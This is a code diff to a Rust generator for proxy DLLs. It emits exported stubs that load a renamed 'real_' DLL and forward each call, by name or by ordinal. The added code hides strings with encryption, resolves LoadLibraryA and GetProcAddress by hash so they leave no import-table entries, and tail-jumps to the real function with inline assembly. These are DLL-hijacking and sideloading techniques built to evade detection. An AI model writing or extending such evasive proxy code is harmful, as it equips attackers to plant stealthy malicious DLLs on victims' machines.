@@ -143,14 +143,72 @@ fn main() {
         if export.starts_with("Ordinal_") {
             let ordinal_num = export.replace("Ordinal_", "");
             def_entries.push_str(&format!("  {} @{} NONAME\n", export, ordinal_num));
+            // Ordinal export: resolve the real function by ordinal number.
+            // On Windows, GetProcAddress accepts an ordinal when the
+            // high word of the name pointer is zero (i.e. the pointer
+            // value IS the ordinal).  We cast the ordinal to a pointer
+            // to achieve MAKEINTRESOURCEA(ordinal) semantics.
             stubs.push_str(&format!(
                 r#"
 #[no_mangle]
 pub unsafe extern "system" fn {}() {{
-    // Ordinal forward stub
+    // Static cache so we resolve only once.
+    static mut CACHED_PROC: *mut std::ffi::c_void = std::ptr::null_mut();
+
+    if CACHED_PROC.is_null() {{
+        let real_dll = string_crypt::enc_str!("real_{}");
+
+        // Resolve LoadLibraryA and GetProcAddress via pe_resolve
+        // to avoid IAT entries in the generated DLL.
+        let k32_base = match pe_resolve::get_module_handle_by_hash(
+            pe_resolve::hash_str(b"kernel32.dll\0")
+        ) {{
+            Some(b) => b,
+            None => return,
+        }};
+        let load_lib_addr = match pe_resolve::get_proc_address_by_hash(
+            k32_base,
+            pe_resolve::hash_str(b"LoadLibraryA\0"),
+        ) {{
+            Some(a) => a,
+            None => return,
+        }};
+        let get_proc_addr = match pe_resolve::get_proc_address_by_hash(
+            k32_base,
+            pe_resolve::hash_str(b"GetProcAddress\0"),
+        ) {{
+            Some(a) => a,
+            None => return,
+        }};
+
+        let load_lib: extern "system" fn(*const i8) -> *mut std::ffi::c_void =
+            std::mem::transmute(load_lib_addr);
+        let get_proc: extern "system" fn(*mut std::ffi::c_void, *const i8) -> *mut std::ffi::c_void =
+            std::mem::transmute(get_proc_addr);
+
+        let lib = load_lib(real_dll.as_ptr() as _);
+        if lib.is_null() {{
+            return;
+        }}
+        // MAKEINTRESOURCEA(ordinal): cast ordinal to LPCSTR with
+        // high word == 0 so GetProcAddress resolves by ordinal.
+        let ordinal_as_name = {}usize as *const i8;
+        let proc = get_proc(lib, ordinal_as_name);
+        if proc.is_null() {{
+            return;
+        }}
+        CACHED_PROC = proc;
+    }}
+
+    // Tail-jump to the real function preserving the full register
+    // state.  On x86-64 Windows the caller passes args in RCX/RDX/
+    // R8/R9 and the callee's return value is in RAX — an indirect
+    // jump to the target function is equivalent to a direct call
+    // from the consumer's perspective (transparent forwarding).
+    std::arch::asm!("jmp rax", in("rax") CACHED_PROC, options(nostack, noreturn));
 }}
 "#,
-                export
+                export, target_dll, ordinal_num
             ));
         } else {
             def_entries.push_str(&format!("  {}\n", export));
@@ -158,45 +216,56 @@ pub unsafe extern "system" fn {}() {{
                 r#"
 #[no_mangle]
 pub unsafe extern "system" fn {}() {{
-    let real_dll = string_crypt::enc_str!("real_{}");
-    let export_name = string_crypt::enc_str!("{}");
+    // Static cache so we resolve only once.
+    static mut CACHED_PROC: *mut std::ffi::c_void = std::ptr::null_mut();
 
-    // P2-19: Resolve LoadLibraryA and GetProcAddress via pe_resolve
-    // at runtime to avoid IAT entries in the generated DLL.
-    let k32_base = match pe_resolve::get_module_handle_by_hash(
-        pe_resolve::hash_str(b"kernel32.dll\0")
-    ) {{
-        Some(b) => b,
-        None => return,
-    }};
-    let load_lib_addr = match pe_resolve::get_proc_address_by_hash(
-        k32_base,
-        pe_resolve::hash_str(b"LoadLibraryA\0"),
-    ) {{
-        Some(a) => a,
-        None => return,
-    }};
-    let get_proc_addr = match pe_resolve::get_proc_address_by_hash(
-        k32_base,
-        pe_resolve::hash_str(b"GetProcAddress\0"),
-    ) {{
-        Some(a) => a,
-        None => return,
-    }};
+    if CACHED_PROC.is_null() {{
+        let real_dll = string_crypt::enc_str!("real_{}");
+        let export_name = string_crypt::enc_str!("{}");
 
-    let load_lib: extern "system" fn(*const i8) -> *mut std::ffi::c_void =
-        std::mem::transmute(load_lib_addr);
-    let get_proc: extern "system" fn(*mut std::ffi::c_void, *const i8) -> *mut std::ffi::c_void =
-        std::mem::transmute(get_proc_addr);
+        // P2-19: Resolve LoadLibraryA and GetProcAddress via pe_resolve
+        // at runtime to avoid IAT entries in the generated DLL.
+        let k32_base = match pe_resolve::get_module_handle_by_hash(
+            pe_resolve::hash_str(b"kernel32.dll\0")
+        ) {{
+            Some(b) => b,
+            None => return,
+        }};
+        let load_lib_addr = match pe_resolve::get_proc_address_by_hash(
+            k32_base,
+            pe_resolve::hash_str(b"LoadLibraryA\0"),
+        ) {{
+            Some(a) => a,
+            None => return,
+        }};
+        let get_proc_addr = match pe_resolve::get_proc_address_by_hash(
+            k32_base,
+            pe_resolve::hash_str(b"GetProcAddress\0"),
+        ) {{
+            Some(a) => a,
+            None => return,
+        }};
 
-    let lib = load_lib(real_dll.as_ptr() as _);
-    if !lib.is_null() {{
-        let proc = get_proc(lib, export_name.as_ptr() as _);
-        if !proc.is_null() {{
-            let f: extern "system" fn() = std::mem::transmute(proc);
-            f();
+        let load_lib: extern "system" fn(*const i8) -> *mut std::ffi::c_void =
+            std::mem::transmute(load_lib_addr);
+        let get_proc: extern "system" fn(*mut std::ffi::c_void, *const i8) -> *mut std::ffi::c_void =
+            std::mem::transmute(get_proc_addr);
+
+        let lib = load_lib(real_dll.as_ptr() as _);
+        if lib.is_null() {{
+            return;
         }}
+        let proc = get_proc(lib, export_name.as_ptr() as _);
+        if proc.is_null() {{
+            return;
+        }}
+        CACHED_PROC = proc;
     }}
+
+    // Tail-jump to the real function preserving the full register
+    // state so arguments (RCX/RDX/R8/R9 + XMM0-3) and the return
+    // value (RAX/XMM0) are forwarded transparently.
+    std::arch::asm!("jmp rax", in("rax") CACHED_PROC, options(nostack, noreturn));
 }}
 "#,
                 export, target_dll, export
